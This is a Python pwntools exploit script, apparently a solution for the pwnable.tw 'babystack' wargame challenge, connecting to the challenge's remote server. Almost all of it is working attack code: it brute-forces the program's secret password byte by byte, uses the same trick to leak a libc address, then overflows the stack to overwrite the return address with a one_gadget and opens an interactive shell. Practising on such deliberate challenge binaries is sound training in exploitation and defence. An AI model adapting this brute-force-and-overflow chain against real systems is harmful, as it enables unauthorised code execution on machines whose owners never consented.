#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./babystack_patched')
libc = ELF('./libc_64.so.6')
ld = ELF('./ld-2.23.so')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu8 = lambda data : u8(data.encode(ENCODING), signed='unsigned')
uu16 = lambda data : u16(data.encode(ENCODING), signed='unsigned')
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
up8 = lambda data : p8(data, signed='unsigned').decode(ENCODING)
up16 = lambda data : p16(data, signed='unsigned').decode(ENCODING)
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('chall.pwnable.tw', 10205)

def login(passwd):
    sa('>> ', '1')
    sa('Your passowrd :', passwd)

def copy(data):
    sa('>> ', '3')
    sa('Copy :', data)
    ru('It is magic copy !\n')

def bruteforce(start_data, size):
    context.log_level = 'warning'
    data = start_data
    for i in range(size):
        for ch in range(1, 0x100):
            login(data + up8(ch) + '\x00')
            resp = ru('\n')
            if resp == 'Login Success !\n':
                warning('ch = ' + hex(ch))
                data += up8(ch)
                sa('>> ', '1') # flip flag
                break
    context.log_level = 'debug'
    return data

# bruteforce random data
passwd = bruteforce('', 0x10)
assert len(passwd) == 0x10
info('passwd[0] = ' + hex(uu64(passwd[:8])))
info('passwd[1] = ' + hex(uu64(passwd[8:])))

# bruteforce libc data
#gdb.attach(p, 'pie breakpoint 0x0000000000000E1E\nc')
login('A' * 0x48)
login('\x00') # set flag
copy('A')
sa('>> ', '1') # flip flag
#gdb.attach(p, 'pie breakpoint 0x0000000000000E43\nc')
data = bruteforce('A' * 8, 0x8)
libc_base = uu64(data[8:].ljust(8, '\x00')) - 0x78439
info('libc_base = ' + hex(libc_base))

# overflow stack
one_gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc_base + one_gadgets[0]
info('one_gadget = ' + hex(one_gadget))
login('\x00' + 'A' * 0x3f + passwd + 'B' * 0x10 + 'C' * 8 + up64(one_gadget))
copy('A')

#gdb.attach(p, 'pie breakpoint 0x0000000000001051\nc')
sa('>> ', '2')

p.interactive()

